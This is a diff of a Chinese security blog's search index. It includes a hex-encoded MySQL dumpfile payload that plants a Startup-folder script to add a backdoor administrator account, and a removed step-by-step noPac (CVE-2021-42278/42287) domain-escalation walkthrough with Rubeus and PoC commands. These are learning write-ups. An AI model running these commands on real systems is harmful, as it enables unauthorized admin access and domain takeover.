+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A</span> <span class="keyword">into</span> dumpfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>MySQL 漏洞利用与提权 | 国光<br><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>总结</tag>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>反弹shell方式总结</title>
-    <url>/2021/11/09/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
+    <url>/articles/c534ae84/</url>
     <content><![CDATA[<h2 id="反弹shell方式总结"><a href="#反弹shell方式总结" class="headerlink" title="反弹shell方式总结"></a>反弹shell方式总结</h2><h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a><code>nc反弹</code></h4><ul>
 <li>场景一 (<em>正向连接</em>)</li>
 </ul>
@@ -637,7 +1135,7 @@
   </entry>
   <entry>
     <title>文件上传方式总结</title>
-    <url>/2021/11/21/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
+    <url>/articles/9372c8c3/</url>
     <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><hr>
 <h2 id="文件上传函数"><a href="#文件上传函数" class="headerlink" title="文件上传函数"></a>文件上传函数</h2><p>PHP中 使用 move_uploaded_file()函数来上传文件，该函数的语法格式如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool move_uploaded_file ( string ``$filename` `, string ``$destination` `)</span><br></pre></td></tr></table></figure>
@@ -722,7 +1220,7 @@
   </entry>
   <entry>
     <title>CVE-2019-5736-Docker逃逸RunC漏洞复现</title>
-    <url>/2021/12/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-5736-Docker%E9%80%83%E9%80%B8RunC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <url>/articles/de574863/</url>
     <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p> Docker 是一个开源的应用容器引擎，基于Go 语言并遵从Apache2.0协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到 Linux 或 Windows 机器上，也可以实现虚拟化。 因为Docker容器是完全使用沙箱机制，Docker逃逸漏洞便成了Docker的漏洞主要利用方式之一。</p>
 <p> Docker逃逸RunC漏洞，在Docker 18.09.2之前的版本中使用了的RunC版本小于1.0-rc6，允许攻击者重写宿主机上的RunC 二进制文件,  从而使得宿主机以root执行命令，从而获取宿主机控制权限。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290912214.jpg" alt="img"></p>
@@ -982,115 +1480,6 @@
       <tags>
         <tag>网络安全</tag>
         <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2021-42278 &amp; CVE-2021-42287 域提权</title>
-    <url>/2021/12/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CVE-2021-42278_CVE-2021-42287%E5%9F%9F%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="CVE-2021-42278"><a href="#CVE-2021-42278" class="headerlink" title="CVE-2021-42278"></a><code>CVE-2021-42278</code></h3><p> 一般来说，机器账号的名字应该以<code>$</code>符号结尾的。例如<code>DC$</code>表示<code>DC</code>这台主机的账户名。但是微软只是进行了规定，并没有验证程序对用户创建的用户名进行验证，也就是说，创建<code>DC</code>用户名完全是可以的。（这里指的是机器账号的<code>sAMAccountName</code>属性）</p>
-<h3 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a><code>CVE-2021-42287</code></h3><p> 结合上面那个漏洞，如果创建了一个用户名为<code>DC</code>的账户，此时使用这个账户去申请一张<code>TGT</code>票据，然后在申请<code>ST</code>之前，将这个账户名修改掉或者删除掉，那么在进行申请<code>ST</code>的时候，<code>KDC</code>在进行验证时就查不到这个账户，此时<code>KDC</code>就会去查找<code>DC$</code>这个账户，如果这个账户存在的话，最终返回的就是<code>DC$</code>这个账户申请的<code>ST</code>。也就相当于获取到了域控账户申请的高权限服务票据。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><p>首先需要一个域内用户，然后提权至域管，接管域控。步骤如下</p>
-<ol>
-<li> 创建一个机器账户</li>
-<li> 清除机器账户的<code>SPN</code></li>
-<li> 修改机器账户的<code>sAMAccountName</code>属性值</li>
-<li> 使用机器账户请求<code>TGT</code></li>
-<li> 再次修改机器账户的<code>sAMAccountName</code>属性值</li>
-<li> 获取高权限<code>ST</code>票据</li>
-</ol>
-<ul>
-<li><h3 id="1-创建机器用户"><a href="#1-创建机器用户" class="headerlink" title="1.创建机器用户"></a>1.创建机器用户</h3></li>
-</ul>
-<blockquote>
-<p>  使用 <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a>  创建一个新的机器账户， <code>syyu$</code></p>
-<p>  当申请一个机器账户<code>MachineCount</code>时，<code>SPN</code>会自动注册</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> syyu <span class="literal">-Domain</span> hacker.me <span class="literal">-DomainController</span> dc.hacker.me <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><h3 id="2-清除SPN"><a href="#2-清除SPN" class="headerlink" title="2.清除SPN"></a>2.清除SPN</h3></li>
-</ul>
-<blockquote>
-<p>  使用 <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> 下的 <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a> 工具 ，进行清除 </p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-DomainObject</span> <span class="string">&quot;CN=syyu,CN=Computers,DC=hacker,DC=me&quot;</span> <span class="literal">-Clear</span> <span class="string">&#x27;serviceprincipalname&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><h3 id="3-修改sAMAccountName属性"><a href="#3-修改sAMAccountName属性" class="headerlink" title="3.修改sAMAccountName属性"></a>3.修改sAMAccountName属性</h3></li>
-</ul>
-<blockquote>
-<p>   将 <strong>sAMAccountName</strong> 改为域控的机器账号名</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nslookup -type=SRV _ldap._tcp  // 查询 域控的主机名</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> // sAMAccountName 改为域控的机器账号名</span><br><span class="line">Set-MachineAccountAttribute -MachineAccount syyu -Value &quot;dc&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><h3 id="4-请求TGT"><a href="#4-请求TGT" class="headerlink" title="4.请求TGT"></a>4.请求TGT</h3></li>
-</ul>
-<blockquote>
-<p>  使用更改后的机器名申请TGT票据，利用 <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> 完成请求</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:dc /password:p@ssWord /domain:hacker.me /dc:dc.hacker.me /nowrap</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><h3 id="5-再次修改sAMAccountName属性值"><a href="#5-再次修改sAMAccountName属性值" class="headerlink" title="5.再次修改sAMAccountName属性值"></a>5.再次修改sAMAccountName属性值</h3></li>
-</ul>
-<blockquote>
-<p>  <code>samaccountname</code>重置会原本的用户名或改为其他域内不存在账户</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount syyu -Value &quot;syyu$&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><h3 id="6-获取高权限ST票据"><a href="#6-获取高权限ST票据" class="headerlink" title="6.获取高权限ST票据"></a>6.获取高权限ST票据</h3></li>
-</ul>
-<blockquote>
-<p>  在采用刚刚获取到的<code>TGT</code>进行<code>S4U2self</code>请求来获取域控<code>ST</code>票据（这个过程<code>KDC</code>会去查找<code>samaccountname</code>，由于刚才<code>MachineCount</code>的<code>samaccountname</code>为<code>dc</code>，所以<code>KDC</code>回去查找这个<code>dc</code>，此时由于已经将<code>MachineCount</code>的<code>samaccountname</code>所更改，<code>KDC</code>查找不到<code>dc</code>就会在后面加上<code>$</code>符去寻找，此时找到的就为域控的<code>dc$</code>，并将它的<code>ST</code>票据返回）</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:&quot;Administrator&quot; /altservice:&quot;ldap/dc.hacker.me&quot; /dc:&quot;dc.hacker.me&quot; /ptt /ticket:[TGT值]</span><br><span class="line"></span><br><span class="line">Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:&quot;CIFS/dc.hacker.me&quot; /dc:&quot;dc.hacker.me&quot; /ptt /ticket:[TGT]</span><br></pre></td></tr></table></figure>
-
-<p>此时，我们便获取了<code>DC</code>的<code>ST</code>票据</p>
-<h2 id="poc使用"><a href="#poc使用" class="headerlink" title="poc使用"></a>poc使用</h2><h3 id="sam-the-admin"><a href="#sam-the-admin" class="headerlink" title="sam_the_admin"></a>sam_the_admin</h3><blockquote>
-<p>  <a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sam_the_admin.py <span class="string">&quot;god/liukaifeng01:hongrisec@2021@&quot;</span> -dc-ip 192.168.52.138 -shell</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="noPac-python"><a href="#noPac-python" class="headerlink" title="noPac_python"></a>noPac_python</h3><blockquote>
-<p>  <a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install impacket</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 noPac.py redteam/saul:<span class="string">&#x27;admin!@#45&#x27;</span> -dc-ip 10.10.10.8 -dc-host owa -shell --impersonate administrator </span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/FHLZLHQ/article/details/121964692">https://blog.csdn.net/FHLZLHQ/article/details/121964692</a></p>
-<p><a href="http://www.m1sn0w.top/2021/12/17/CVE-2021-42278&amp;CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">http://www.m1sn0w.top/2021/12/17/CVE-2021-42278&amp;CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
-<p><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a></p>
-<p><a href="https://sairson.cn/index.php/archives/45/">https://sairson.cn/index.php/archives/45/</a></p>
-<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p><a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
-<p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
-<p><a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
-<p><a href="https://github.com/ricardojba/Invoke-noPac">https://github.com/ricardojba/Invoke-noPac</a></p>
-<h2 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h2><p><a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
-<p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
-<p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>漏洞复现</category>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>漏洞复现</tag>
-        <tag>域提权</tag>
       </tags>
   </entry>
 </search>
